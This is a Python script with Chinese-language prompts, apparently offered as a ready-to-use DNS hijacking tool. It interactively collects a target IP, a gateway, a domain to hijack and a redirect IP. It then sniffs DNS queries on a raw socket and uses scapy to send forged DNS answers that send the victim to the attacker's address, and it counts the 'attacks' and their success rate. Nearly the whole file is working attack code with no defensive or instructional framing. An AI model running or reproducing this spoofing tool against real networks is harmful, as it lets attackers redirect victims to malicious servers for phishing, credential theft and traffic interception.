#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
简单DNS劫持工具 - 自定义配置版本
支持自定义配置和Y/N确认执行
"""

import time
import threading
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
import socket

class SimpleDNSHijack:
    def __init__(self):
        self.is_running = False
        self.target_ip = ""
        self.gateway_ip = ""
        self.redirect_domain = ""
        self.redirect_ip = ""
        self.attack_duration = 300
        self.listen_port = 53
        
        # 统计信息
        self.stats = {
            'queries_intercepted': 0,
            'responses_sent': 0,
            'start_time': None
        }
    
    def get_configuration(self):
        """获取用户自定义配置"""
        print("=" * 60)
        print("          DNS劫持工具 - 自定义配置")
        print("=" * 60)
        
        # 目标IP配置
        while True:
            target_ip = input("请输入目标IP地址 (例如: 192.168.1.100): ").strip()
            if self.validate_ip(target_ip):
                self.target_ip = target_ip
                break
            else:
                print("❌ IP地址格式不正确，请重新输入")
        
        # 网关IP配置
        while True:
            gateway_ip = input("请输入网关IP地址 (例如: 192.168.1.1): ").strip()
            if self.validate_ip(gateway_ip):
                self.gateway_ip = gateway_ip
                break
            else:
                print("❌ IP地址格式不正确，请重新输入")
        
        # 劫持域名配置
        while True:
            domain = input("请输入要劫持的域名 (例如: example.com): ").strip()
            if domain:
                self.redirect_domain = domain
                break
            else:
                print("❌ 域名不能为空")
        
        # 重定向IP配置
        while True:
            redirect_ip = input("请输入重定向到的IP地址 (例如: 192.168.1.200): ").strip()
            if self.validate_ip(redirect_ip):
                self.redirect_ip = redirect_ip
                break
            else:
                print("❌ IP地址格式不正确，请重新输入")
        
        # 攻击时长配置
        while True:
            try:
                duration = int(input("请输入攻击时长(秒) (默认300): ").strip() or "300")
                if duration > 0:
                    self.attack_duration = duration
                    break
                else:
                    print("❌ 时长必须大于0")
            except ValueError:
                print("❌ 请输入有效的数字")
        
        # 监听端口配置
        while True:
            try:
                port = int(input("请输入监听端口 (默认53): ").strip() or "53")
                if 1 <= port <= 65535:
                    self.listen_port = port
                    break
                else:
                    print("❌ 端口必须在1-65535之间")
            except ValueError:
                print("❌ 请输入有效的数字")
        
        return self.show_configuration()
    
    def validate_ip(self, ip):
        """验证IP地址格式"""
        import re
        pattern = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
        return re.match(pattern, ip) is not None
    
    def show_configuration(self):
        """显示配置信息并请求确认"""
        print("\n" + "=" * 60)
        print("          配置确认")
        print("=" * 60)
        print(f"目标IP: {self.target_ip}")
        print(f"网关IP: {self.gateway_ip}")
        print(f"劫持域名: {self.redirect_domain}")
        print(f"重定向IP: {self.redirect_ip}")
        print(f"攻击时长: {self.attack_duration}秒")
        print(f"监听端口: {self.listen_port}")
        print("=" * 60)
        
        # 请求用户确认
        while True:
            confirm = input("\n确认执行DNS劫持攻击? (Y/N): ").strip().upper()
            if confirm == 'Y':
                return True
            elif confirm == 'N':
                print("❌ 攻击已取消")
                return False
            else:
                print("❌ 请输入 Y 或 N")
    
    def start_hijack(self):
        """开始DNS劫持攻击"""
        print("=" * 60)
        print("          DNS劫持攻击开始")
        print("=" * 60)
        print(f"目标IP: {self.target_ip}")
        print(f"网关IP: {self.gateway_ip}")
        print(f"劫持域名: {self.redirect_domain}")
        print(f"重定向IP: {self.redirect_ip}")
        print(f"攻击时长: {self.attack_duration}秒")
        print(f"监听端口: {self.listen_port}")
        print("=" * 60)
        
        self.is_running = True
        self.stats['start_time'] = time.time()
        self.stats['queries_intercepted'] = 0
        self.stats['responses_sent'] = 0
        
        # 启动DNS劫持
        try:
            self.dns_hijack_worker()
        except KeyboardInterrupt:
            print("\n[!] 用户中断攻击")
        except Exception as e:
            print(f"[-] DNS劫持错误: {e}")
        finally:
            self.stop_attack()
    
    def dns_hijack_worker(self):
        """DNS劫持工作线程"""
        print(f"[+] 开始监听端口 {self.listen_port}...")
        
        end_time = time.time() + self.attack_duration
        
        # 创建原始套接字
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.bind(('0.0.0.0', self.listen_port))
        except PermissionError:
            print("[-] 需要管理员权限才能监听端口53")
            return
        
        while self.is_running and time.time() < end_time:
            try:
                # 接收数据包
                data, addr = sock.recvfrom(65535)
                
                # 解析DNS查询
                packet = IP(data)
                if UDP in packet and packet[UDP].dport == 53:
                    self.stats['queries_intercepted'] += 1
                    
                    # 检查是否是目标域名的查询
                    if DNS in packet and packet[DNS].qr == 0:  # DNS查询
                        query_name = packet[DNSQR].qname.decode('utf-8').rstrip('.')
                        
                        if self.redirect_domain.lower() in query_name.lower():
                            # 构造伪造的DNS响应
                            spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                                         UDP(dport=packet[UDP].sport, sport=53) / \
                                         DNS(id=packet[DNS].id,
                                             qr=1,
                                             qd=packet[DNS].qd,
                                             an=DNSRR(rrname=packet[DNSQR].qname,
                                                     ttl=3600,
                                                     rdata=self.redirect_ip))
                            
                            # 发送伪造响应
                            send(spoofed_pkt, verbose=0)
                            self.stats['responses_sent'] += 1
                            
                            print(f"[+] 劫持DNS查询: {query_name} -> {self.redirect_ip}")
                
                # 显示进度
                elapsed = time.time() - self.stats['start_time']
                if int(elapsed) % 10 == 0:
                    print(f"[+] 已拦截 {self.stats['queries_intercepted']} 个查询，发送 {self.stats['responses_sent']} 个响应")
                
            except Exception as e:
                print(f"[-] DNS劫持错误: {e}")
                time.sleep(1)
        
        sock.close()
    
    def stop_attack(self):
        """停止攻击"""
        if self.is_running:
            print("\n[+] 停止DNS劫持攻击...")
            self.is_running = False
            
            # 显示统计信息
            elapsed = time.time() - self.stats['start_time']
            print(f"\n[+] 攻击统计:")
            print(f"    - 总运行时间: {int(elapsed)}秒")
            print(f"    - 拦截DNS查询: {self.stats['queries_intercepted']}")
            print(f"    - 发送伪造响应: {self.stats['responses_sent']}")
            print(f"    - 成功率: {self.stats['responses_sent'] / max(1, self.stats['queries_intercepted']) * 100:.1f}%")

def main():
    """主函数"""
    try:
        hijack = SimpleDNSHijack()
        
        # 获取配置并确认
        if hijack.get_configuration():
            hijack.start_hijack()
        
    except KeyboardInterrupt:
        print("\n[!] 程序被用户中断")
    except Exception as e:
        print(f"[-] 程序错误: {e}")

if __name__ == "__main__":
    main()